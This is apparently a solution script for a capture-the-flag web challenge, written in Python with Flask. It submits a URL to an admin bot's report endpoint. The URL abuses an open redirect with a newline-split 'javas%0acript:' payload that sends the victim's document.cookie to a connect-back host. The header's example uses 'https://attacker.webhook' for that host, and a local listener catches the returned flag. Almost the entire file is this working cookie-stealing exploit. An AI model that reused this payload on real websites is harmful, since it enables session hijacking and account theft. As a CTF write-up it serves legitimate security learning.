# docker run -it -e BOT_BASE_URL=http://localhost:1337 -e CONNECTBACK_URL=https://attacker.webhook --network=host $(docker build -q ./solution) 

from flask import Flask, request
import os
import requests
import threading
import time
from urllib.parse import quote_plus
import re

app = Flask(__name__)

@app.route("/")
def index():
    flag = request.args.get("FLAG", "")
    if len(flag) > 0:
        print(f"flag received: {flag}")
        os._exit(0)
    return ""


def report_url():
    time.sleep(1)  # wait for flask to start

    BOT_BASE_URL = os.getenv("BOT_BASE_URL", "http://localhost:1337")
    CONNECTBACK_URL = os.getenv("CONNECTBACK_URL", "")

    payload = f"""javas%0acript:location.assign("{CONNECTBACK_URL}/?"%2Bdocument.cookie)"""
    path = "redirect?to=" + payload
    print(f"Reporting URL: {path}")

    res = requests.post(
        f"{BOT_BASE_URL}/api/report",
        json={"path": path},
        headers={"Content-Type": "application/json"},
    )

    print(f"Reported URL: {path}, Response: {res.text}")


if __name__ == "__main__":
    threading.Thread(target=report_url).start()
    app.run(host="0.0.0.0", port=9999)
